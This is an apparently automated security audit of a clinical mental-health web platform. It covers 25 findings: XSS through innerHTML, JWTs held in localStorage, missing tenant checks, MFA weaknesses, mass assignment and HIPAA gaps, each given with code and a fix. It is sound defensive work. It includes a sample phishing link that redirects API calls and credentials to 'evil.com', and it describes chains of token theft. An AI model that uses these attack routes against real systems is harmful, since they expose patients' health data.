# Peacefull.ai — Red-Team Security & Quality Audit Report

**Date:** 2026-02-28  
**Auditor:** Automated Red-Team Analysis  
**Scope:** Full-stack clinical platform — frontend (prototype-web), API (packages/api)

---

## Executive Summary

| Severity | Count |
|----------|-------|
| CRITICAL | 5 |
| HIGH | 8 |
| MEDIUM | 7 |
| LOW | 5 |
| **Total** | **25** |

The platform demonstrates solid foundations (Zod validation, bcrypt, JWT dual-mode auth, helmet, CORS, rate limiting, role-based access, step-up auth, PHI masking). However, critical gaps exist around **XSS via innerHTML**, **token storage in localStorage**, **missing tenant isolation on patient sub-routes**, **account lockout bypass**, and **unsanitized PUT endpoint**.

---

## Findings

---

### SEC-001 — Mass innerHTML Usage Without Sanitization (XSS)

| Field | Value |
|-------|-------|
| **Severity** | CRITICAL |
| **Category** | Security |
| **File** | [prototype-web/public/js/render.js](prototype-web/public/js/render.js) |

**Description:**  
There are **37 distinct `innerHTML` assignments** in render.js. These inject template literals containing application state values (patient names, summaries, clinical notes, audit trail entries, signal bands, etc.) directly into the DOM without any HTML escaping or sanitization. No `escapeHtml()` function is used anywhere in render.js, and no DOMPurify or equivalent library is imported.

If any of these values originate from user input or the database (which they do when live API mode is active), an attacker who injects `<script>` or `<img onerror=...>` payloads into patient names, journal entries, triage summaries, or memory statements can achieve persistent XSS.

**Specific high-risk lines (patient-controlled data interpolated into innerHTML):**

| Line | Context |
|------|---------|
| [L70](prototype-web/public/js/render.js#L70) | Triage queue — `item.patient`, `item.summary` |
| [L80](prototype-web/public/js/render.js#L80) | Triage detail — `selected.patient`, `selected.summary` |
| [L102](prototype-web/public/js/render.js#L102) | Memory items — `item.strategy`, `item.description` |
| [L113](prototype-web/public/js/render.js#L113) | Memory detail — user content |
| [L146](prototype-web/public/js/render.js#L146) | Treatment plan — `item.goal`, `item.intervention` |
| [L388](prototype-web/public/js/render.js#L388) | MBC scores — `item.instrument`, `item.clinicianNote` |
| [L467](prototype-web/public/js/render.js#L467) | Escalation items — `item.summary`, `item.trigger` |
| [L489](prototype-web/public/js/render.js#L489) | Audit trail — `e` (arbitrary user string) |
| [L695](prototype-web/public/js/render.js#L695) | Resources — items rendered unsanitized |
| [L725](prototype-web/public/js/render.js#L725) | Chat messages — message content |
| [L754](prototype-web/public/js/render.js#L754) | History entries — `e.summary` |
| [L811](prototype-web/public/js/render.js#L811) | Safety plan steps — `step.items` |
| [L868](prototype-web/public/js/render.js#L868) | Patient memories — strategy text |
| [L1132](prototype-web/public/js/render.js#L1132)–[L1186](prototype-web/public/js/render.js#L1186) | SDOH data |

**Recommended Fix:**
1. Import/implement an `escapeHtml()` utility and apply it to **every** user-derived value before innerHTML interpolation.
2. Alternatively, adopt DOMPurify: `el.innerHTML = DOMPurify.sanitize(html)`.
3. For simple text values, prefer `textContent` (already used in `renderSubmissionSurfaces` — inconsistently applied).

---

### SEC-002 — JWT Tokens Stored in localStorage (Token Theft via XSS)

| Field | Value |
|-------|-------|
| **Severity** | CRITICAL |
| **Category** | Security |
| **File** | [prototype-web/public/js/api.js](prototype-web/public/js/api.js) |

**Description:**  
Both access and refresh tokens are stored in `localStorage` ([L29](prototype-web/public/js/api.js#L29)–[L30](prototype-web/public/js/api.js#L30)):

```js
let accessToken = localStorage.getItem('peacefull_access_token') || null;
let refreshToken = localStorage.getItem('peacefull_refresh_token') || null;
```

Written to storage at [L37](prototype-web/public/js/api.js#L37)–[L40](prototype-web/public/js/api.js#L40). User profile also stored at [L71](prototype-web/public/js/api.js#L71).

`localStorage` is accessible to any JavaScript running on the page. Combined with SEC-001 (37 XSS vectors), an attacker can trivially exfiltrate both tokens and impersonate any authenticated user, including clinicians with access to PHI.

**Recommended Fix:**
1. Store tokens in `httpOnly`, `Secure`, `SameSite=Strict` cookies set by the server.
2. If localStorage must be used (SPA constraint), mitigate with short-lived access tokens (≤5 min) and ensure all XSS vectors (SEC-001) are eliminated first.
3. Remove refresh tokens from client-side storage entirely — use cookie-based refresh flow.

---

### SEC-003 — Missing Tenant Isolation on Patient Sub-Resource Routes (IDOR)

| Field | Value |
|-------|-------|
| **Severity** | CRITICAL |
| **Category** | Security |
| **File** | [packages/api/src/routes/patients.ts](packages/api/src/routes/patients.ts) |

**Description:**  
The `GET /` endpoint correctly scopes by tenant ([L160](packages/api/src/routes/patients.ts#L160): `where: { tenantId: req.user!.tid }`). However, **all sub-resource routes** that take `:id` or `:id/submissions`, `:id/checkin`, `:id/journal`, `:id/voice`, `:id/safety-plan`, `:id/session-prep`, `:id/progress`, `:id/memories`, `:id/history` look up patients by `id` alone, with **no verification that the patient belongs to the authenticated user's tenant**.

A user in Tenant A can access any patient in Tenant B by guessing/enumerating UUIDs.

**Affected endpoints (all in patients.ts):**
- `GET /:id` — [L170](packages/api/src/routes/patients.ts#L170)
- `PATCH /:id` — [L202](packages/api/src/routes/patients.ts#L202)
- `PUT /:id` — [L222](packages/api/src/routes/patients.ts#L222)
- `POST /:id/submissions` — [L240](packages/api/src/routes/patients.ts#L240)
- `GET /:id/submissions` — [L273](packages/api/src/routes/patients.ts#L273)
- `GET /:id/session-prep` — [L325](packages/api/src/routes/patients.ts#L325)
- `GET /:id/progress` — [L430](packages/api/src/routes/patients.ts#L430)
- `GET /:id/safety-plan` — [L448](packages/api/src/routes/patients.ts#L448)
- `GET /:id/memories` — [L506](packages/api/src/routes/patients.ts#L506)
- `GET /:id/history` — [L544](packages/api/src/routes/patients.ts#L544)
- `POST /:id/checkin` — [L616](packages/api/src/routes/patients.ts#L616)
- `POST /:id/journal` — [L646](packages/api/src/routes/patients.ts#L646)
- `POST /:id/voice` — [L676](packages/api/src/routes/patients.ts#L676)

**Recommended Fix:**  
Add a tenant check after every patient lookup:
```ts
if (row.tenantId !== req.user!.tid) throw new AppError('Access denied', 403);
```
Or apply `requireTenant` middleware at the router level using `req.params.id` resolution.

---

### SEC-004 — No Account Lockout / Brute-Force Protection on Login

| Field | Value |
|-------|-------|
| **Severity** | CRITICAL |
| **Category** | Security |
| **File** | [packages/api/src/routes/auth.ts](packages/api/src/routes/auth.ts#L153-L195) |

**Description:**  
The `/login` endpoint ([L153](packages/api/src/routes/auth.ts#L153)) has no:
- Failed attempt counter
- Account lockout after N failures
- Progressive delay / exponential backoff
- Per-user rate limiting

The global rate limiter ([server.ts L63](packages/api/src/server.ts#L63)) is set to 100 requests per 15-minute window, which allows **100 password guesses per IP per window** — far too high for a login endpoint. A dedicated `/auth/login` rate limiter (e.g., 5 attempts per 15 min per email) is absent.

Additionally, the `/mfa-verify` endpoint ([L217](packages/api/src/routes/auth.ts#L217)) has no attempt limit, making the 6-digit MFA code brute-forceable (1M combinations) within the global rate limit.

**Recommended Fix:**
1. Add a per-IP + per-email rate limiter on `/auth/login` (e.g., 5 attempts/15 min).
2. Implement account lockout after 5 consecutive failures, with email notification.
3. Add MFA attempt limiting (max 3–5 attempts per challenge).
4. Log all failed authentication attempts with IP for audit.

---

### SEC-005 — Unsanitized PUT Endpoint Bypasses Zod Validation (Mass Assignment)

| Field | Value |
|-------|-------|
| **Severity** | CRITICAL |
| **Category** | Security |
| **File** | [packages/api/src/routes/patients.ts](packages/api/src/routes/patients.ts#L222-L234) |

**Description:**  
The `PUT /:id` endpoint passes `req.body` directly to Prisma without any schema validation:

```ts
patientRouter.put('/:id', async (req, res, next) => {
  const row = await prisma.patient.update({
    where: { id: req.params.id },
    data: req.body,   // ← No validation!
```

While the `PATCH /:id` endpoint uses `updatePatientSchema.parse(req.body)` with `.strict()`, the PUT endpoint completely bypasses this. An attacker can modify **any column** on the Patient row, including `tenantId`, `userId`, or any field that should be immutable.

**Recommended Fix:**  
Either remove the PUT endpoint or apply the same `updatePatientSchema.parse(req.body)` validation.

---

### SEC-006 — MFA Code Logged in Plaintext

| Field | Value |
|-------|-------|
| **Severity** | HIGH |
| **Category** | Security |
| **File** | [packages/api/src/routes/auth.ts](packages/api/src/routes/auth.ts#L186) |

**Description:**  
The MFA code is logged in the authLogger at [L186](packages/api/src/routes/auth.ts#L186):
```ts
authLogger.info({ userId: user.id, code }, 'MFA code generated (dev log)');
```
The comment says "(dev log)" but there is no guard for `NODE_ENV !== 'production'`. In production, MFA codes would appear in log aggregators (CloudWatch, Datadog, etc.), visible to operators.

**Recommended Fix:**  
Gate the log behind a dev environment check, or log at `debug` level (which is suppressed in production by default), or remove the code from the log payload entirely.

---

### SEC-007 — In-Memory MFA Store and Token Revocation Set

| Field | Value |
|-------|-------|
| **Severity** | HIGH |
| **Category** | Security |
| **File** | [packages/api/src/routes/auth.ts](packages/api/src/routes/auth.ts#L55-L58) |

**Description:**  
MFA pending codes and revoked refresh tokens are stored in-memory:
```ts
const pendingMFA: Record<string, string> = {};
const invalidatedTokens = new Set<string>();
```
These are lost on server restart and not shared across instances. In a multi-instance deployment:
- MFA challenge issued on instance A cannot be verified on instance B
- Logged-out tokens remain valid on other instances
- The `invalidatedTokens` set grows unboundedly (memory leak)

**Recommended Fix:**  
Migrate to Redis or a database table with TTL-based expiry.

---

### SEC-008 — Missing CSRF Protection

| Field | Value |
|-------|-------|
| **Severity** | HIGH |
| **Category** | Security |
| **File** | [packages/api/src/server.ts](packages/api/src/server.ts) |

**Description:**  
No CSRF token mechanism is implemented. While the API uses Bearer token auth (which provides some CSRF resistance since tokens aren't auto-attached), if tokens were ever moved to cookies (recommended by SEC-002), CSRF would become exploitable immediately. State-changing operations (POST/PATCH/PUT/DELETE) on clinical data lack an additional CSRF check.

**Recommended Fix:**  
Implement CSRF tokens (e.g., `csrf` or `csurf` middleware) or ensure the `SameSite=Strict` cookie attribute is used if switching to cookie-based auth.

---

### SEC-009 — Missing Tenant Isolation on Clinician Sub-Resource Routes

| Field | Value |
|-------|-------|
| **Severity** | HIGH |
| **Category** | Security |
| **File** | [packages/api/src/routes/clinician.ts](packages/api/src/routes/clinician.ts) |

**Description:**  
The clinician routes scope top-level endpoints (dashboard, caseload, triage, escalations) through `getClinicianProfile` → `getClinicianPatientIds`, but several sub-resource endpoints access patients by ID without verifying they belong to the clinician's caseload or tenant:

- `GET /patients/:id` — [L230](packages/api/src/routes/clinician.ts#L230): no tenant check
- `GET /patients/:id/drafts` — [L270](packages/api/src/routes/clinician.ts#L270): no caseload check
- `PATCH /patients/:id/drafts/:draftId` — [L283](packages/api/src/routes/clinician.ts#L283): no caseload check
- `GET /patients/:id/memories` — [L308](packages/api/src/routes/clinician.ts#L308): no caseload check
- `GET /patients/:id/plans` — [L351](packages/api/src/routes/clinician.ts#L351): no caseload check
- `GET /patients/:id/session-notes` — [L503](packages/api/src/routes/clinician.ts#L503): no caseload check
- `GET /patients/:id/adherence` — [L577](packages/api/src/routes/clinician.ts#L577): no caseload check
- `GET /patients/:id/escalations` — [L601](packages/api/src/routes/clinician.ts#L601): no caseload check

A clinician from one organization can access patients from another organization by guessing UUIDs.

**Recommended Fix:**  
For each `/:id` sub-route, verify `patient.tenantId === req.user!.tid` or verify the patient is in the clinician's active caseload.

---

### SEC-010 — Refresh Token Sent in Request Body (Not httpOnly Cookie)

| Field | Value |
|-------|-------|
| **Severity** | HIGH |
| **Category** | Security |
| **File** | [prototype-web/public/js/api.js](prototype-web/public/js/api.js#L98-L101) |

**Description:**  
The refresh token is sent in the request body to `/auth/refresh`:
```js
body: JSON.stringify({ refreshToken }),
```
This means the refresh token is accessible to JavaScript and stored in localStorage. If an XSS vulnerability is exploited, the attacker gains both access and refresh tokens, achieving full persistent account takeover.

**Recommended Fix:**  
Send refresh tokens via `httpOnly` cookies with `Secure` and `SameSite=Strict` flags.

---

### SEC-011 — API Base URL Controllable via Query Parameter

| Field | Value |
|-------|-------|
| **Severity** | HIGH |
| **Category** | Security |
| **File** | [prototype-web/public/js/api.js](prototype-web/public/js/api.js#L11-L22) |

**Description:**  
The API base URL can be overridden via `?api=` query parameter ([L14](prototype-web/public/js/api.js#L14)):
```js
const fromQuery = params.get('api');
if (fromQuery) {
  localStorage.setItem('peacefull_api_url', fromQuery);
  return fromQuery;
}
```
An attacker can craft a phishing link like `https://app.peacefull.ai?api=https://evil.com/api/v1` that redirects all API calls (including credentials) to a malicious server. The value also persists in localStorage.

**Recommended Fix:**  
Remove the query-parameter override, or restrict allowed values to a whitelist of known API endpoints.

---

### SEC-012 — Non-Constant-Time MFA Code Comparison

| Field | Value |
|-------|-------|
| **Severity** | MEDIUM |
| **Category** | Security |
| **File** | [packages/api/src/services/auth.ts](packages/api/src/services/auth.ts#L127-L129) |

**Description:**  
MFA verification uses direct string comparison:
```ts
export function verifyMFACode(code: string, secret: string): boolean {
  return code === secret;
}
```
This is susceptible to timing attacks. While the 6-digit space is small, constant-time comparison is best practice.

**Recommended Fix:**  
Use `crypto.timingSafeEqual(Buffer.from(code), Buffer.from(secret))`.

---

### SEC-013 — Error Handler Leaks Stack Traces in Non-Production

| Field | Value |
|-------|-------|
| **Severity** | MEDIUM |
| **Category** | Security |
| **File** | [packages/api/src/middleware/error.ts](packages/api/src/middleware/error.ts#L89-L115) |

**Description:**  
The error handler at [L108](packages/api/src/middleware/error.ts#L108) returns `err.message` verbatim when `NODE_ENV !== 'production'`:
```ts
const message = isProduction && !isOperational
  ? 'Internal server error'
  : err.message;
```
In staging or development, internal error messages (including database errors, file paths, and Prisma query details) are exposed to the client. If staging is accessible externally, this leaks infrastructure details.

**Recommended Fix:**  
Apply the same sanitization to staging. Only expose raw messages in true local development.

---

### SEC-014 — CORS Wildcard in Test Setup

| Field | Value |
|-------|-------|
| **Severity** | LOW |
| **Category** | Security |
| **File** | [packages/api/src/__tests__/setup.ts](packages/api/src/__tests__/setup.ts#L14) |

**Description:**  
Test setup sets `CORS_ORIGIN = '*'`. The production CORS handler ([server.ts L33](packages/api/src/server.ts#L33)) accepts wildcard as a valid origin, meaning if `CORS_ORIGIN` is accidentally set to `*` in production, all origins would be permitted.

**Recommended Fix:**  
Add a runtime guard that rejects `*` in production mode: `if (env.NODE_ENV === 'production' && allowedOrigins.includes('*')) throw new Error(...)`.

---

### CLIN-001 — Demo MFA Fallback Accepts Any 6-Digit Code

| Field | Value |
|-------|-------|
| **Severity** | HIGH |
| **Category** | Clinical Safety |
| **File** | [prototype-web/public/js/index.js](prototype-web/public/js/index.js#L293-L299) |

**Description:**  
When the API is unavailable ("offline mode"), the MFA verification screen accepts **any** 6-digit code:
```js
} else {
  // Demo fallback — any 6 digits works
  showScreen('clinician-caseload');
  showToast('Clinician authenticated (offline mode)');
}
```
This bypasses authentication entirely. If the offline mode is accidentally active in a production-adjacent deployment, anyone can access the clinician dashboard.

**Recommended Fix:**  
Clearly prevent offline MFA bypass in anything that connects to real patient data. Display a clear "demo mode" watermark if offline fallback is used.

---

### CLIN-002 — Safety Plan Editable Without Clinical Review

| Field | Value |
|-------|-------|
| **Severity** | MEDIUM |
| **Category** | Clinical Safety |
| **File** | [packages/api/src/routes/patients.ts](packages/api/src/routes/patients.ts#L471-L500) |

**Description:**  
The `PUT /:id/safety-plan` endpoint allows any authenticated user (PATIENT, CLINICIAN, or SUPERVISOR — per the router-level role gate) to modify the safety plan, including its steps. A patient could alter their own safety plan without clinician review, which is clinically unsafe.

**Recommended Fix:**  
Restrict safety plan modification to CLINICIAN/SUPERVISOR roles, or require clinician co-sign on patient-initiated changes.

---

### CLIN-003 — Session Note Signing Lacks Co-Signature Workflow

| Field | Value |
|-------|-------|
| **Severity** | MEDIUM |
| **Category** | Clinical Safety |
| **File** | [packages/api/src/routes/clinician.ts](packages/api/src/routes/clinician.ts#L549-L567) |

**Description:**  
The session note signing endpoint ([L549](packages/api/src/routes/clinician.ts#L549)) sets `signed: true` without verifying the signer is the note's author or a supervisor. Any authenticated clinician can sign any note. Supervisory co-signature (required for trainees) is not enforced.

**Recommended Fix:**  
Verify `req.user!.sub === note.clinicianId` or `req.user!.role === 'SUPERVISOR'` before allowing signing.

---

### UX-001 — Login and Registration Forms Lack Native HTML5 Validation

| Field | Value |
|-------|-------|
| **Severity** | MEDIUM |
| **Category** | UX |
| **File** | [prototype-web/index.html](prototype-web/index.html#L1078-L1121) |

**Description:**  
Login and registration inputs have no `required` attribute and are not wrapped in `<form>` elements. This means:
- No native browser validation or submission via Enter key
- No form-level autocomplete association
- Screen readers miss the form context

Inputs at [L1080](prototype-web/index.html#L1080)–[L1085](prototype-web/index.html#L1085) (registration) and [L1120](prototype-web/index.html#L1120)–[L1121](prototype-web/index.html#L1121) (login) use `placeholder` as labels instead of visible `<label>` elements with `for` attributes.

**Recommended Fix:**  
1. Wrap inputs in `<form>` elements with `onsubmit` handlers.
2. Add `required` attributes to all mandatory fields.
3. Add visible `<label>` elements alongside `aria-label` (not `placeholder` as label).

---

### UX-002 — Missing Skip-to-Content Link

| Field | Value |
|-------|-------|
| **Severity** | LOW |
| **Category** | UX / Accessibility |
| **File** | [prototype-web/index.html](prototype-web/index.html) |

**Description:**  
The page has no skip-to-content link for keyboard and screen-reader users. The quick-nav bar ([L424](prototype-web/index.html#L424)) is the first focusable region with 9 buttons, forcing keyboard users to tab through navigation before reaching content.

**Recommended Fix:**  
Add a visually-hidden skip link as the first element inside `<body>`:
```html
<a href="#main-content" class="sr-only focus:not-sr-only">Skip to content</a>
```

---

### UX-003 — Inline onclick Handlers Instead of Event Delegation

| Field | Value |
|-------|-------|
| **Severity** | LOW |
| **Category** | UX / Code Quality |
| **File** | [prototype-web/index.html](prototype-web/index.html) |

**Description:**  
Multiple elements use inline `onclick` handlers (e.g., `onclick="handleLogin()"` at [L1122](prototype-web/index.html#L1122), `onclick="handleRegister()"` at [L1093](prototype-web/index.html#L1093)). This violates CSP best practices and prevents Content-Security-Policy `script-src` from disallowing `unsafe-inline`.

Note: The codebase has `initEventDelegation()` in events.js, showing awareness of this pattern, but it's incomplete.

**Recommended Fix:**  
Migrate all remaining inline handlers to event delegation or `addEventListener` calls.

---

### COMP-001 — PHI in localStorage Without Encryption

| Field | Value |
|-------|-------|
| **Severity** | HIGH |
| **Category** | Compliance (HIPAA) |
| **File** | [prototype-web/public/js/api.js](prototype-web/public/js/api.js#L62-L71) |

**Description:**  
User profile data (potentially including names, email, role) is stored unencrypted in localStorage:
```js
localStorage.setItem('peacefull_user', JSON.stringify(user));
```
Under HIPAA, any individually identifiable health information must be encrypted at rest. Browser localStorage is not encrypted and persists until explicitly cleared.

**Recommended Fix:**  
1. Minimize data stored client-side — only store non-PHI session identifiers.
2. If profile data must be cached, encrypt it with a session-derived key.
3. Clear localStorage on session end/logout (partially done via `clearAuth()`).

---

### COMP-002 — Encryption Key Not Enforced Outside Production

| Field | Value |
|-------|-------|
| **Severity** | MEDIUM |
| **Category** | Compliance (HIPAA) |
| **File** | [packages/api/src/config/env.ts](packages/api/src/config/env.ts#L62) |

**Description:**  
The `ENCRYPTION_KEY` for PHI at rest is only validated in production mode ([L80](packages/api/src/config/env.ts#L80)). In staging environments connected to real data, PHI may be stored unencrypted.

**Recommended Fix:**  
Enforce `ENCRYPTION_KEY` in both production and staging. Only allow it to be optional in development/test.

---

### COMP-003 — Audit Log Coverage Gap on Read Operations

| Field | Value |
|-------|-------|
| **Severity** | MEDIUM |
| **Category** | Compliance (HIPAA) |
| **File** | [packages/api/src/middleware/audit.ts](packages/api/src/middleware/audit.ts) |

**Description:**  
HIPAA requires logging of all PHI access, including read operations. While the server has `auditLog` middleware, patient record reads (GET endpoints) need to be verified for inclusion. The GET endpoints in patients.ts and clinician.ts do not explicitly log which records were accessed by which user — relying solely on generic middleware may miss the patient ID context.

**Recommended Fix:**  
Ensure audit logs capture `userId`, `patientId`, `action`, and `timestamp` for every PHI access, including reads.

---

### COMP-004 — No Content-Security-Policy Header

| Field | Value |
|-------|-------|
| **Severity** | LOW |
| **Category** | Compliance / Security |
| **File** | [prototype-web/index.html](prototype-web/index.html#L9) |

**Description:**  
The HTML page loads Tailwind CSS from a CDN (`https://cdn.tailwindcss.com`) at [L9](prototype-web/index.html#L9) and has no CSP meta tag or header. Combined with inline `onclick` handlers, CSP cannot be enforced. This increases XSS impact.

**Recommended Fix:**  
1. Bundle Tailwind at build time instead of loading from CDN.
2. Add CSP headers via meta tag or server configuration.
3. Remove inline event handlers (see UX-003).

---

### COMP-005 — Missing Cookie Attributes for Session Management

| Field | Value |
|-------|-------|
| **Severity** | LOW |
| **Category** | Compliance |
| **File** | [packages/api/src/server.ts](packages/api/src/server.ts) |

**Description:**  
CORS is configured with `credentials: true` ([L38](packages/api/src/server.ts#L38)), but no cookies are actually set by the server. When the platform migrates tokens to cookies (per SEC-002), `Secure`, `httpOnly`, and `SameSite=Strict` flags must be applied. Currently there is no cookie-setting infrastructure.

**Recommended Fix:**  
Pre-build cookie-based auth infrastructure with proper attributes before going to production.

---

## Summary of Actions by Priority

### Immediate (Pre-Launch Blockers)
1. **SEC-001**: Sanitize all 37 innerHTML assignments in render.js
2. **SEC-003 + SEC-009**: Add tenant isolation checks to all patient/:id and clinician/patients/:id routes
3. **SEC-004**: Implement per-endpoint rate limiting and account lockout on /auth/login and /mfa-verify
4. **SEC-005**: Remove or validate the PUT /:id endpoint
5. **SEC-002 + SEC-010**: Migrate tokens from localStorage to httpOnly cookies

### High Priority (Before PHI Exposure)
6. **SEC-006**: Remove MFA code from production logs
7. **SEC-007**: Migrate MFA/revocation to Redis
8. **SEC-011**: Remove ?api= query parameter override
9. **CLIN-001**: Disable offline MFA bypass in production builds
10. **COMP-001**: Encrypt or eliminate PHI in localStorage

### Medium Priority (Before GA)
11. **SEC-008**: Implement CSRF protection
12. **SEC-012**: Use constant-time MFA comparison
13. **SEC-013**: Sanitize error messages in staging
14. **CLIN-002**: Add clinical review gate on safety plan edits
15. **CLIN-003**: Enforce session note signing authorization
16. **UX-001**: Add form semantics and native validation
17. **COMP-002**: Enforce encryption key in staging

### Low Priority (Continuous Improvement)
18. **COMP-003**: Enhance audit log granularity
19. **COMP-004**: Implement CSP
20. **UX-002**: Add skip-to-content link
21. **UX-003**: Migrate inline handlers to event delegation
22. **SEC-014**: Guard against wildcard CORS in production
23. **COMP-005**: Pre-build cookie auth infrastructure
